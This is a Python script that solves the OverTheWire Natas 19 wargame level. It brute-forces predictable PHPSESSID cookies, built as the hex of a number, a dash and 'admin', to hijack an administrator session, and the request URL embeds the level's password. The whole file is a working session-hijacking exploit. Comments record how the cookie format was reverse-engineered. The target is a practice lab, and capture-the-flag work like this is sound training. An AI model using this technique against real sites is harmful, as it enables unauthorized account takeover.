import requests

target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/index.php'
data = {'username':'','password':'','submit':'Login'}
# u=''    p=''  3334362d
# u='a'   p=''  3134352d61
# u='a'   p='a' 3631362d61
# u='ad'  p=''  3138352d6164

# Note -> Always ends with 2d. Always starts with 3. Followed by hex encoding of username after 2d. Hex decode of 2d = - .

successfulStr = 'You are an admin.'

for i in range(1,641):
	requiredValue = str(i).encode('hex')+'2d'+'admin'.encode('hex')
	cookie = {'PHPSESSID':requiredValue}
	r = requests.get(target,cookies=cookie)
	print i
	if r.text.find(successfulStr) != -1 :
		print 'Done'
		print r.text
		break